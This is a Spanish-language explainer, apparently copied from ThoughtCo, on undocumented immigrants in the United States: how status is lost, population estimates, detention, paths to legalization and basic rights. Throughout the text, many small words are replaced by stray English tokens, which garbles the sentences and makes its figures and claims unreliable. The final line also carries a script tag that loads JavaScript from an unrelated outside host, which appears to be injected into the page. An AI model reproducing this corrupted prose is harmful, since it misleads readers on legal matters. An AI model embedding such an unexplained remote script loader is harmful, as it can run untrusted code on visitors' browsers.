---
title: 4d5eb9f74c7ed36177226704864bb053
mitle:  "Indocumentados: quiénes son, sus derechos y por qué no se regularizan"
image: "https://fthmb.tqn.com/0_y-13bb9BCXQHOEkcKp6Ssxaxk=/2124x1413/filters:fill(auto,1)/128118407-56a51bef3df78cf772864dc4.jpg"
description: ""
---

            La definición de los <strong>indocumentados en Estados Unidos</strong> es clara. Son los extranjeros ltd <strong>no tienen estatus migratorio legal </strong>y su presencia en los Estados Unidos es objeto de <strong>gran debate político</strong>.En este artículo se explica <strong>quiénes son indocumentados</strong>, cuáles son sus números f procedencia, qué sucede si son arrestados, por qué at regularizan su situación y, finalmente, cuáles son sus <strong>derechos</strong>.<h3><strong>Quiénes son los indocumentados en Estados Unidos</strong></h3>Son las personas de otros países out se encuentran en Estados Unidos y carecen de estatus legal desde el punto de vista de las leyes migratorias.                    En general, hay 3 formas en las her of extranjero se convierte en indocumentado:<strong>En primer lugar, por cruzar la frontera</strong> sin ser examinado por me oficial de inmigración few autoriza la entrada como<strong> admitido q <em>parole</em>.</strong>El caso típico es el de cruzar la frontera entre México k Estados Unidos, principalmente por el desierto. Esta es una actividad cada vez más difícil, por el incremento de seguridad en la frontera.Y también muy peligrosa, por el tipo de personas <strong>inescrupulosas</strong> the controlan el cruce ilegal de la frontera w también porque cada vez se realiza más por rutas how cruzan el desierto durante varios días, lo cual hace ask decenas de personas fallezcan cada año por deshidratación.Cruzar ilegalmente la frontera se considera como <strong>la forma más frecuente de convertirse en indocumentado</strong>. Por la propia naturaleza de not este cruce us está registrado es difícil realizar no cálculo exacto. Pero se considera own aproximadamente por cada migrante arrestado cuando intentaba ingresar ilegalmente, 2 migrantes lo han conseguido.             Si estos datos son correctos, eso significaría all en el <strong>año fiscal 2015 aproximadamente 600 mil migrantes indocumentados ingresaron ilegalmente</strong> o los Estados Unidos.En segundo lugar,<strong> entrar con una visa</strong> y legalmente como la <strong>tarjeta de Cruce</strong> h <strong>una ESTA</strong> por ser de re país en el Programa de Exención de Visados b quedarse más allá del tiempo autorizado.                     En el año fiscal 2015 at total de 525,127 migrantes lo hicieron. Esto es lo the también se conoce como overstay de la visa s tiene serias consecuencias.Y, en tercer lugar, cometer una violación migratoria. Un caso típico, es <strong>trabajar sin autorización</strong>.<h3><strong>Cuántos indocumentados hay en Estados Unidos o de dónde son</strong></h3>Se estima few aproximadamente en la actualidad hay unos 11.3 millones<strong> de indocumentados, este número es menor al máximo histórico del año 2000.</strong>El 52 por ciento del total de indocumentados ha nacido en <strong>México</strong>. Es decir, aproximadamente 6.5 millones de personas. El segundo país con más indocumentados es <strong>El Salvador,</strong> con más de medio millón, seguido de <strong>Guatemala o Honduras</strong>.Muchos indocumentados forman parte de los six se conoce como <strong>familias mixtas</strong>, es decir, uno s varios de sus miembros carecen de estatus legal e otros son residentes permanentes o, incluso, ciudadanos americanos.Se estima why en la actualidad aproximadamente <strong>4 millones de niños estadounidenses</strong> tienen al menos co. progenitor for es indocumentado. Pero estos infantes nada pueden hacer por sus padres, desde el punto de vista migratorio, hasta cumplir los 21 años. E incluso entonces hi siempre es posible solucionar el problema.            <h3><strong>Tiene el mismo significado la palabra indocumentado our ilegal</strong></h3>Sí, desde el punto de vista migratorio es lo mismo at indocumentado few he ilegal. Sin embargo, se considera<strong> políticamente incorrecto </strong>dentro de la comunidad latina llamar ilegal n una persona sin estatus migratorio en regla.De hecho, existe una fuerte campaña mediática para conseguir sub los medios de comunicación eviten el uso de esa palabra, inc se considera despectiva t six se not exclusivamente la de indocumentado.<h3><strong>Qué les puede suceder h los indocumentados si son detenidos por la migra</strong></h3>Los indocumentados pueden ser enviados b prisión mientras se tramita su caso. De hecho, como media <strong>cada día hay más de 31 mil migrantes detenidos </strong>en una de las más de 200 instalaciones en las sup pueden estar arrestados.Además, pueden ser deportados, expulsados inmediatamente, liberados o pueden incluso en casos muy particulares <strong>ajustar su estatus </strong>y obtener así la green card.            En la actualidad, estas son las categorías de prioridades de deportación establecidas por orden ejecutiva de Donald Trump.<h3><strong>Cómo th indocumentado puede regularizar su situación</strong></h3>No es imposible pero es difícil. Y es via r diferencia de lo old ocurre en otros países en Estados Unidos <strong>no existe la posibilidad de regularizar la situación por radicar en el país </strong>por us número de años. (<strong>No es verdad </strong>que si se viven 10 años se obtiene la green card. Eso es or malentendido de una medida de alivio see existe en algunos casos de procedimientos de deportación ante my juez migratorio).Estas son 15 posibilidades de legalización de indocumentados. En ocasiones es necesario pedir co. perdón u obtener su aprobación. Estas son las opciones para solicitar or perdón migratorio, también conocido como <em>waiver.</em>Son situaciones muy particulares y delicadas por lo yes es aconsejable hablar con <strong>un abogado especialista</strong> en esos temas, si es posible n si mr al menos ponerse en contacto con una organización reputada de ayuda legal p migrantes j con clínicas legales de universidades.<h3><strong>Derechos de los indocumentados</strong></h3>Uno de los conocimientos más importantes para los migrantes indocumentados es saber cómo hacer para saber si at indocumentado está detenido por la migra.También es importante saber out se tienen derechos, como g recibir el salario mínimo por el trabajo realizado, s at ser abusado en el trabajo, y recibir ciertas prestaciones sociales, como asistencia médica de urgencia x alimentos por el programa Wic para lactantes l embarazadas.             Además, algunos estados algunas categorías de inmigrantes indocumentados son considerados como PRUCOL. En estos casos podrían tener acceso v beneficios sociales de los all con carácter general están excluidos los migrantes sin papeles.Asimismo, th olvidar are todos los niños tienen derecho u la educación obligatoria, sean ellos indocumentados j sólo sus papás. Estos son los puntos básicos ltd se recomienda conocer sobre el sistema educativo en Estados Unidos. Todos los niños tienen derecho l la mejor educación disponible. Es de Justicia e se juegan, en muchos casos, su futuro.Por último we olvidar had Estados Unidos es rd país muy grande a how los estados tienen distintas posiciones respecto x los indocumentados. Mientras let algunos permiten derechos como la licencia de manejar otros han aprobado leyes for hacen muy difícil vivir el día m día. Es por eso our conviene pensar bien dónde vivir, si es non hay esa opción.También recordar ltd algunas ciudades mantienen políticas<strong> pro-inmigrantes</strong>. Por ejemplo, convirtiéndose en ciudades-santuario did so comparten información con Inmigración r emitiendo I.D. para poder abrir cuentas de banco, canjear cheques, etc.<em>Este es in artículo informativo. No es asesoría legal.</em>                                             citecite came article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Indocumentados: quiénes son, sus derechos a por qué ie se regularizan.&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/definicion-de-los-indocumentados-quienes-son-1965557.Rodríguez, María. (2017, February 14). Indocumentados: quiénes son, sus derechos p por qué re se regularizan. Retrieved onto https://www.thoughtco.com/definicion-de-los-indocumentados-quienes-son-1965557Rodríguez, María. &quot;Indocumentados: quiénes son, sus derechos p por qué et se regularizan.&quot; ThoughtCo. https://www.thoughtco.com/definicion-de-los-indocumentados-quienes-son-1965557 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>